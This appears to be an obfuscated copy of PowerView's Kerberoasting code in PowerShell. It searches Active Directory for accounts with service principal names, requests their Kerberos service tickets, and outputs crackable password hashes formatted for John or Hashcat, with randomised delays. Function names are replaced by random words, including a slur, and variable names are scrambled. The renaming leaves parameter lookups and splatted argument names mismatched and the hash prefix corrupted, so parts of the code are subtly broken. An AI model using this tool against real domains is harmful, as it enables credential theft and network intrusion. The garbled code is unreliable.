function ailments {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $lmpoHFip99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $hDkmmNGJ99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $zXlYBNyx99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $UZLlpeCi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cRJNqgGn99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $eaGOmLHK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $xnnQEhQX99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $WXCpeLYG99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $KaypDOMB99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iGPcENIU99,
        [Switch]
        $jmFrpjMS99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xxOSszLz99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $KGZbqGnh99 = $lmpoHFip99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $DsxotCwa99 = homeopathy -xxOSszLz99 $xxOSszLz99
            }
            else {
                $DsxotCwa99 = homeopathy
            }
            $KGZbqGnh99 = $DsxotCwa99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($DsxotCwa99) {
                    $UWrKIIIs99 = $DsxotCwa99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $UWrKIIIs99 = ((homeopathy -xxOSszLz99 $xxOSszLz99).PdcRoleOwner).Name
                }
                else {
                    $UWrKIIIs99 = ((homeopathy).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[ailments] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $UWrKIIIs99 = $eaGOmLHK99
        }
        $RHWQZTHd99 = 'LDAP://'
        if ($UWrKIIIs99 -and ($UWrKIIIs99.Trim() -ne '')) {
            $RHWQZTHd99 += $UWrKIIIs99
            if ($KGZbqGnh99) {
                $RHWQZTHd99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $RHWQZTHd99 += $cRJNqgGn99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($UZLlpeCi99 -Match '^GC://') {
                $DN = $UZLlpeCi99.ToUpper().Trim('/')
                $RHWQZTHd99 = ''
            }
            else {
                if ($UZLlpeCi99 -match '^LDAP://') {
                    if ($UZLlpeCi99 -match "LDAP://.+/.+") {
                        $RHWQZTHd99 = ''
                        $DN = $UZLlpeCi99
                    }
                    else {
                        $DN = $UZLlpeCi99.SubString(7)
                    }
                }
                else {
                    $DN = $UZLlpeCi99
                }
            }
        }
        else {
            if ($KGZbqGnh99 -and ($KGZbqGnh99.Trim() -ne '')) {
                $DN = "DC=$($KGZbqGnh99.Replace('.', ',DC='))"
            }
        }
        $RHWQZTHd99 += $DN
        Write-Verbose "[ailments] search string: $RHWQZTHd99"
        if ($xxOSszLz99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[ailments] Using alternate credentials for LDAP connection"
            $DsxotCwa99 = New-Object DirectoryServices.DirectoryEntry($RHWQZTHd99, $xxOSszLz99.UserName, $xxOSszLz99.GetNetworkCredential().Password)
            $KxvCAKoW99 = New-Object System.DirectoryServices.DirectorySearcher($DsxotCwa99)
        }
        else {
            $KxvCAKoW99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$RHWQZTHd99)
        }
        $KxvCAKoW99.PageSize = $WXCpeLYG99
        $KxvCAKoW99.SearchScope = $xnnQEhQX99
        $KxvCAKoW99.CacheResults = $False
        $KxvCAKoW99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $KxvCAKoW99.ServerTimeLimit = $KaypDOMB99
        }
        if ($PSBoundParameters['Tombstone']) {
            $KxvCAKoW99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $KxvCAKoW99.filter = $hDkmmNGJ99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $KxvCAKoW99.SecurityMasks = Switch ($iGPcENIU99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $dxcrjJqq99 = $zXlYBNyx99| ForEach-Object { $_.Split(',') }
            $Null = $KxvCAKoW99.PropertiesToLoad.AddRange(($dxcrjJqq99))
        }
        $KxvCAKoW99
    }
}
function decanter {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $zXlYBNyx99
    )
    $oePSCHnu99 = @{}
    $zXlYBNyx99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $oePSCHnu99[$_] = $zXlYBNyx99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $oePSCHnu99[$_] = $zXlYBNyx99[$_][0] -as $kicIhgEd99
            }
            elseif ($_ -eq 'samaccounttype') {
                $oePSCHnu99[$_] = $zXlYBNyx99[$_][0] -as $TLucafOT99
            }
            elseif ($_ -eq 'objectguid') {
                $oePSCHnu99[$_] = (New-Object Guid (,$zXlYBNyx99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $oePSCHnu99[$_] = $zXlYBNyx99[$_][0] -as $OUpNvdja99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $vzkEmIWX99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $zXlYBNyx99[$_][0], 0
                if ($vzkEmIWX99.Owner) {
                    $oePSCHnu99['Owner'] = $vzkEmIWX99.Owner
                }
                if ($vzkEmIWX99.Group) {
                    $oePSCHnu99['Group'] = $vzkEmIWX99.Group
                }
                if ($vzkEmIWX99.DiscretionaryAcl) {
                    $oePSCHnu99['DiscretionaryAcl'] = $vzkEmIWX99.DiscretionaryAcl
                }
                if ($vzkEmIWX99.SystemAcl) {
                    $oePSCHnu99['SystemAcl'] = $vzkEmIWX99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($zXlYBNyx99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $oePSCHnu99[$_] = "NEVER"
                }
                else {
                    $oePSCHnu99[$_] = [datetime]::fromfiletime($zXlYBNyx99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($zXlYBNyx99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $zXlYBNyx99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $oePSCHnu99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $oePSCHnu99[$_] = ([datetime]::FromFileTime(($zXlYBNyx99[$_][0])))
                }
            }
            elseif ($zXlYBNyx99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $zXlYBNyx99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $oePSCHnu99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[decanter] error: $_"
                    $oePSCHnu99[$_] = $Prop[$_]
                }
            }
            elseif ($zXlYBNyx99[$_].count -eq 1) {
                $oePSCHnu99[$_] = $zXlYBNyx99[$_][0]
            }
            else {
                $oePSCHnu99[$_] = $zXlYBNyx99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $oePSCHnu99
    }
    catch {
        Write-Warning "[decanter] Error parsing LDAP properties : $_"
    }
}
function homeopathy {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $lmpoHFip99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xxOSszLz99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[homeopathy] Using alternate credentials for homeopathy'
            if ($PSBoundParameters['Domain']) {
                $KGZbqGnh99 = $lmpoHFip99
            }
            else {
                $KGZbqGnh99 = $xxOSszLz99.GetNetworkCredential().Domain
                Write-Verbose "[homeopathy] Extracted domain '$KGZbqGnh99' from -xxOSszLz99"
            }
            $DTGtpHyX99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $KGZbqGnh99, $xxOSszLz99.UserName, $xxOSszLz99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DTGtpHyX99)
            }
            catch {
                Write-Verbose "[homeopathy] The specified domain '$KGZbqGnh99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DTGtpHyX99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $lmpoHFip99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DTGtpHyX99)
            }
            catch {
                Write-Verbose "[homeopathy] The specified domain '$lmpoHFip99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[homeopathy] Error retrieving the current domain: $_"
            }
        }
    }
}
function fairways {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $uDPqeNSX99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $JRzNYjPo99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xxOSszLz99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $TBiiDWHF99 = Invoke-UserImpersonation -xxOSszLz99 $xxOSszLz99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $QifXAxkg99 = $User
        }
        else {
            $QifXAxkg99 = $SPN
        }
	
	$nuDQPCLS99 = New-Object System.Random
        ForEach ($Object in $QifXAxkg99) {
            if ($PSBoundParameters['User']) {
                $EUPDgYdg99 = $Object.ServicePrincipalName
                $HkWwnpbc99 = $Object.SamAccountName
                $usHWaZDV99 = $Object.DistinguishedName
            }
            else {
                $EUPDgYdg99 = $Object
                $HkWwnpbc99 = 'UNKNOWN'
                $usHWaZDV99 = 'UNKNOWN'
            }
            if ($EUPDgYdg99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $EUPDgYdg99 = $EUPDgYdg99[0]
            }
            try {
                $cwpewNVm99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $EUPDgYdg99
            }
            catch {
                Write-Warning "[fairways] Error requesting ticket for SPN '$EUPDgYdg99' from user '$usHWaZDV99' : $_"
            }
            if ($cwpewNVm99) {
                $MDNcLIiz99 = $cwpewNVm99.GetRequest()
            }
            if ($MDNcLIiz99) {
                $Out = New-Object PSObject
                $GWNcsLVZ99 = [System.BitConverter]::ToString($MDNcLIiz99) -replace '-'
                if($GWNcsLVZ99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $tLzbkFqJ99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $QwZleGNG99 = $Matches.DataToEnd.Substring(0,$tLzbkFqJ99*2)
                    if($Matches.DataToEnd.Substring($tLzbkFqJ99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($cwpewNVm99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($MDNcLIiz99).Replace('-',''))
                    } else {
                        $Hash = "$($QwZleGNG99.Substring(0,32))`$$($QwZleGNG99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($cwpewNVm99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($MDNcLIiz99).Replace('-',''))
                }
                if($Hash) {
                    if ($uDPqeNSX99 -match 'John') {
                        $ggQhJeWg99 = "`$URaorxwV99`$$($cwpewNVm99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($usHWaZDV99 -ne 'UNKNOWN') {
                            $fGtktsWS99 = $usHWaZDV99.SubString($usHWaZDV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $fGtktsWS99 = 'UNKNOWN'
                        }
                        $ggQhJeWg99 = "`$URaorxwV99`$$($Etype)`$*$HkWwnpbc99`$$fGtktsWS99`$$($cwpewNVm99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $ggQhJeWg99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $HkWwnpbc99
                $Out | Add-Member Noteproperty 'DistinguishedName' $usHWaZDV99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $cwpewNVm99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $nuDQPCLS99.Next((1-$JRzNYjPo99)*$Delay, (1+$JRzNYjPo99)*$Delay)
        }
    }
    END {
        if ($TBiiDWHF99) {
            Invoke-RevertToSelf -TokenHandle $TBiiDWHF99
        }
    }
}
function retards {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $SGbvGEMv99,
        [Switch]
        $SPN,
        [Switch]
        $dflisgCj99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $umfkLnjF99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $LoxRDBpH99,
        [Switch]
        $fXxYkqaB99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $EKvqmRGN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $lmpoHFip99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $hDkmmNGJ99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $zXlYBNyx99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $UZLlpeCi99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $eaGOmLHK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $xnnQEhQX99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $WXCpeLYG99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $KaypDOMB99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iGPcENIU99,
        [Switch]
        $jmFrpjMS99,
        [Alias('ReturnOne')]
        [Switch]
        $TDMGBmYX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xxOSszLz99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $fOFUGcwv99 = @{}
        if ($PSBoundParameters['Domain']) { $fOFUGcwv99['Domain'] = $lmpoHFip99 }
        if ($PSBoundParameters['Properties']) { $fOFUGcwv99['Properties'] = $zXlYBNyx99 }
        if ($PSBoundParameters['SearchBase']) { $fOFUGcwv99['SearchBase'] = $UZLlpeCi99 }
        if ($PSBoundParameters['Server']) { $fOFUGcwv99['Server'] = $eaGOmLHK99 }
        if ($PSBoundParameters['SearchScope']) { $fOFUGcwv99['SearchScope'] = $xnnQEhQX99 }
        if ($PSBoundParameters['ResultPageSize']) { $fOFUGcwv99['ResultPageSize'] = $WXCpeLYG99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $fOFUGcwv99['ServerTimeLimit'] = $KaypDOMB99 }
        if ($PSBoundParameters['SecurityMasks']) { $fOFUGcwv99['SecurityMasks'] = $iGPcENIU99 }
        if ($PSBoundParameters['Tombstone']) { $fOFUGcwv99['Tombstone'] = $jmFrpjMS99 }
        if ($PSBoundParameters['Credential']) { $fOFUGcwv99['Credential'] = $xxOSszLz99 }
        $GpFHjnAj99 = ailments @SearcherArguments
    }
    PROCESS {
        if ($GpFHjnAj99) {
            $TVayfkER99 = ''
            $UQQZjzkm99 = ''
            $SGbvGEMv99 | Where-Object {$_} | ForEach-Object {
                $wJjDqUro99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($wJjDqUro99 -match '^S-1-') {
                    $TVayfkER99 += "(objectsid=$wJjDqUro99)"
                }
                elseif ($wJjDqUro99 -match '^CN=') {
                    $TVayfkER99 += "(distinguishedname=$wJjDqUro99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $TfLZrykO99 = $wJjDqUro99.SubString($wJjDqUro99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[retards] Extracted domain '$TfLZrykO99' from '$wJjDqUro99'"
                        $fOFUGcwv99['Domain'] = $TfLZrykO99
                        $GpFHjnAj99 = ailments @SearcherArguments
                        if (-not $GpFHjnAj99) {
                            Write-Warning "[retards] Unable to retrieve domain searcher for '$TfLZrykO99'"
                        }
                    }
                }
                elseif ($wJjDqUro99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $YyyeRupV99 = (([Guid]$wJjDqUro99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $TVayfkER99 += "(objectguid=$YyyeRupV99)"
                }
                elseif ($wJjDqUro99.Contains('\')) {
                    $oFrVkLsy99 = $wJjDqUro99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($oFrVkLsy99) {
                        $fGtktsWS99 = $oFrVkLsy99.SubString(0, $oFrVkLsy99.IndexOf('/'))
                        $OWzorXmn99 = $wJjDqUro99.Split('\')[1]
                        $TVayfkER99 += "(samAccountName=$OWzorXmn99)"
                        $fOFUGcwv99['Domain'] = $fGtktsWS99
                        Write-Verbose "[retards] Extracted domain '$fGtktsWS99' from '$wJjDqUro99'"
                        $GpFHjnAj99 = ailments @SearcherArguments
                    }
                }
                else {
                    $TVayfkER99 += "(samAccountName=$wJjDqUro99)"
                }
            }
            if ($TVayfkER99 -and ($TVayfkER99.Trim() -ne '') ) {
                $UQQZjzkm99 += "(|$TVayfkER99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[retards] Searching for non-null service principal names'
                $UQQZjzkm99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[retards] Searching for users who can be delegated'
                $UQQZjzkm99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[retards] Searching for users who are sensitive and not trusted for delegation'
                $UQQZjzkm99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[retards] Searching for adminCount=1'
                $UQQZjzkm99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[retards] Searching for users that are trusted to authenticate for other principals'
                $UQQZjzkm99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[retards] Searching for user accounts that do not require kerberos preauthenticate'
                $UQQZjzkm99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[retards] Using additional LDAP filter: $hDkmmNGJ99"
                $UQQZjzkm99 += "$hDkmmNGJ99"
            }
            $sMunuQaC99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $qLlHtyXm99 = $_.Substring(4)
                    $EuPhzbkw99 = [Int]($OUpNvdja99::$qLlHtyXm99)
                    $UQQZjzkm99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$EuPhzbkw99))"
                }
                else {
                    $EuPhzbkw99 = [Int]($OUpNvdja99::$_)
                    $UQQZjzkm99 += "(userAccountControl:1.2.840.113556.1.4.803:=$EuPhzbkw99)"
                }
            }
            $GpFHjnAj99.filter = "(&(samAccountType=805306368)$UQQZjzkm99)"
            Write-Verbose "[retards] filter string: $($GpFHjnAj99.filter)"
            if ($PSBoundParameters['FindOne']) { $ELPLXULf99 = $GpFHjnAj99.FindOne() }
            else { $ELPLXULf99 = $GpFHjnAj99.FindAll() }
            $ELPLXULf99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = decanter -zXlYBNyx99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($ELPLXULf99) {
                try { $ELPLXULf99.dispose() }
                catch {
                    Write-Verbose "[retards] Error disposing of the Results object: $_"
                }
            }
            $GpFHjnAj99.dispose()
        }
    }
}
function Chaldean {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $SGbvGEMv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $lmpoHFip99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $hDkmmNGJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $UZLlpeCi99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $eaGOmLHK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $xnnQEhQX99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $WXCpeLYG99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $KaypDOMB99,
        [Switch]
        $jmFrpjMS99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $JRzNYjPo99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $uDPqeNSX99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xxOSszLz99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $hIWOiHyX99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $hIWOiHyX99['Domain'] = $lmpoHFip99 }
        if ($PSBoundParameters['LDAPFilter']) { $hIWOiHyX99['LDAPFilter'] = $hDkmmNGJ99 }
        if ($PSBoundParameters['SearchBase']) { $hIWOiHyX99['SearchBase'] = $UZLlpeCi99 }
        if ($PSBoundParameters['Server']) { $hIWOiHyX99['Server'] = $eaGOmLHK99 }
        if ($PSBoundParameters['SearchScope']) { $hIWOiHyX99['SearchScope'] = $xnnQEhQX99 }
        if ($PSBoundParameters['ResultPageSize']) { $hIWOiHyX99['ResultPageSize'] = $WXCpeLYG99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $hIWOiHyX99['ServerTimeLimit'] = $KaypDOMB99 }
        if ($PSBoundParameters['Tombstone']) { $hIWOiHyX99['Tombstone'] = $jmFrpjMS99 }
        if ($PSBoundParameters['Credential']) { $hIWOiHyX99['Credential'] = $xxOSszLz99 }
        if ($PSBoundParameters['Credential']) {
            $TBiiDWHF99 = Invoke-UserImpersonation -xxOSszLz99 $xxOSszLz99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $hIWOiHyX99['Identity'] = $SGbvGEMv99 }
        retards @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | fairways -Delay $Delay -uDPqeNSX99 $uDPqeNSX99 -JRzNYjPo99 $JRzNYjPo99
    }
    END {
        if ($TBiiDWHF99) {
            Invoke-RevertToSelf -TokenHandle $TBiiDWHF99
        }
    }
}
